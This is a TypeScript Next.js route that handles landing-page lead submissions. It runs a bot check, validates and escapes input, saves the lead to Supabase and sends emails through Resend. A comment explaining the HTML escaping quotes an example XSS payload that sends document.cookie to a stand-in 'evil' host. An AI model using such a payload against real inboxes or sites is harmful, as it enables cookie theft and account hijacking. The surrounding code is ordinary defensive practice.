import { NextResponse } from "next/server";
import { createAdminClient } from "@/lib/supabase/admin";
import {
  isValidEmail,
  escapeHtml,
  isBotSubmission,
  sanitizeText,
} from "@/lib/validation";

const RESEND_API_KEY = process.env.RESEND_API_KEY || "";
const OWNER_EMAIL = "sitanim8@gmail.com";
const FROM_EMAIL = "Omni AI <bookings@omnileadsagi.com>";
const SITE_URL = process.env.NEXT_PUBLIC_SITE_URL || "https://omnileadsagi.com";

async function sendEmail(to: string, subject: string, html: string) {
  if (!RESEND_API_KEY) return;
  await fetch("https://api.resend.com/emails", {
    method: "POST",
    headers: {
      Authorization: `Bearer ${RESEND_API_KEY}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ from: FROM_EMAIL, to: [to], subject, html }),
  });
}

export async function POST(request: Request) {
  try {
    const body = await request.json();

    // Bot check — honeypot field comes first so spambots get a clean
    // 200 without us touching Supabase or Resend. Returning success
    // (not 4xx) is intentional: a 400 tells the bot to adjust and
    // retry; a silent success makes it think the submission landed
    // and move on to the next victim.
    if (isBotSubmission(body)) {
      return NextResponse.json({ success: true });
    }

    const name = sanitizeText(body.name, 200);
    const phone = sanitizeText(body.phone, 50);
    const emailRaw = sanitizeText(body.email, 254);
    const slug = sanitizeText(body.slug, 200);

    if (!name || !phone || !emailRaw || !slug) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
    }

    // Server-side email validation. Previously we only checked presence;
    // the client regex was the only thing between us and `{"email":"not-an-email"}`
    // making it into Resend as a recipient. Worse, a crafted payload could
    // ask us to send our branded "You're in" email to any address on the
    // internet, weaponizing our sender reputation.
    if (!isValidEmail(emailRaw)) {
      return NextResponse.json({ error: "Please enter a valid email address." }, { status: 400 });
    }
    const email = emailRaw.toLowerCase();

    const supabase = createAdminClient();
    const pageUrl = `${SITE_URL}/${slug}`;

    // 1. Check newsletter subscription
    const { data: sub } = await supabase
      .from("newsletter_subscriptions")
      .select("subscribed, subscription_tier")
      .eq("email", email)
      .single();

    const isSubscriber = sub?.subscribed === true;
    const tier = sub?.subscription_tier || "none";

    // 2. Insert lead into Supabase
    //
    // Previously this was a fire-and-forget insert — if the DB write failed
    // (RLS change, schema drift, connection error) the route still returned
    // `{ success: true }` and the user saw the "You're in" confirmation
    // screen while the lead silently dropped. Capture the error, log it
    // server-side, and surface a generic 500 so the client-side catch in
    // LeadForm re-shows the "something went wrong" message and the user
    // can retry.
    const { error: insertError } = await supabase
      .from("landing_page_leads")
      .insert({
        slug,
        name,
        phone,
        email,
        is_newsletter_subscriber: isSubscriber,
      });
    if (insertError) {
      console.error("[landing-lead] insert error:", insertError);
      return NextResponse.json(
        { error: "We couldn't save your submission. Please try again." },
        { status: 500 },
      );
    }

    // Escape every user-controlled value before it lands in the email
    // HTML. Without this, a `name` of
    //   <img src=x onerror="fetch('//evil/?c='+document.cookie)">
    // would render as live HTML inside the owner's inbox. Tier the
    // escape specifically for HTML text-content + double-quoted attrs
    // (that's what escapeHtml covers) — which matches every echo site
    // in the template.
    const nameEsc = escapeHtml(name);
    const phoneEsc = escapeHtml(phone);
    const emailEsc = escapeHtml(email);
    const slugEsc = escapeHtml(slug);
    const pageUrlEsc = escapeHtml(pageUrl);
    const tierEsc = escapeHtml(tier);
    const firstNameEsc = escapeHtml(name.split(" ")[0] || name);

    // 3. Notify owner
    await sendEmail(
      OWNER_EMAIL,
      `New Lead from omnileadsagi.com/${slugEsc}`,
      `
      <div style="font-family:sans-serif;max-width:560px;margin:0 auto;color:#111;">
        <h2 style="margin-bottom:4px;">New lead from <a href="${pageUrlEsc}" style="color:#6366f1;">${pageUrlEsc}</a></h2>
        <p style="color:#555;margin-top:0;">Submitted via the landing page form.</p>
        <table style="width:100%;border-collapse:collapse;margin-top:20px;">
          <tr><td style="padding:10px 0;border-bottom:1px solid #eee;font-weight:600;width:120px;">Name</td><td style="padding:10px 0;border-bottom:1px solid #eee;">${nameEsc}</td></tr>
          <tr><td style="padding:10px 0;border-bottom:1px solid #eee;font-weight:600;">Phone</td><td style="padding:10px 0;border-bottom:1px solid #eee;">${phoneEsc}</td></tr>
          <tr><td style="padding:10px 0;border-bottom:1px solid #eee;font-weight:600;">Email</td><td style="padding:10px 0;border-bottom:1px solid #eee;"><a href="mailto:${emailEsc}" style="color:#6366f1;">${emailEsc}</a></td></tr>
          <tr><td style="padding:10px 0;border-bottom:1px solid #eee;font-weight:600;">Newsletter</td><td style="padding:10px 0;border-bottom:1px solid #eee;">${isSubscriber ? `&#10004; Subscribed (${tierEsc})` : "&#10007; Not subscribed"}</td></tr>
          <tr><td style="padding:10px 0;font-weight:600;">Landing Page</td><td style="padding:10px 0;"><a href="${pageUrlEsc}" style="color:#6366f1;">${pageUrlEsc}</a></td></tr>
        </table>
      </div>
      `
    );

    // 4. Thank-you email to lead
    const newsletterNote = isSubscriber
      ? `<p style="color:#6b7280;margin-top:8px;">We also see you're already part of our Interlinked newsletter community — you're ahead of the curve.</p>`
      : `<p style="color:#6b7280;margin-top:8px;">While you wait, check out our free newsletter at <a href="${SITE_URL}/newsletter" style="color:#6366f1;">omnileadsagi.com/newsletter</a> — AI insights for business owners, delivered weekly.</p>`;

    await sendEmail(
      email,
      "We got your info — talk soon",
      `
      <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#050508;color:#fff;padding:40px;border-radius:16px;">
        <h1 style="font-size:28px;font-weight:900;margin-bottom:8px;background:linear-gradient(135deg,#c4b5fd,#f0abfc);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">
          You're in, ${firstNameEsc}.
        </h1>
        <p style="color:#d1d5db;font-size:16px;line-height:1.6;margin-bottom:16px;">
          We got your info and we're already excited. We look forward to working with you — expect to hear from us very soon.
        </p>
        ${newsletterNote}
        <div style="margin-top:32px;">
          <a href="${SITE_URL}" style="display:inline-block;background:linear-gradient(135deg,#6366f1,#ec4899);color:#fff;font-weight:700;font-size:15px;padding:14px 28px;border-radius:100px;text-decoration:none;">
            Visit Omni AI →
          </a>
        </div>
        <p style="margin-top:40px;color:#4b5563;font-size:13px;">
          — The Omni AI Team &nbsp;·&nbsp; <a href="${SITE_URL}" style="color:#6366f1;">omnileadsagi.com</a>
        </p>
      </div>
      `
    );

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error("landing-lead error:", err);
    return NextResponse.json({ error: "Internal server error" }, { status: 500 });
  }
}
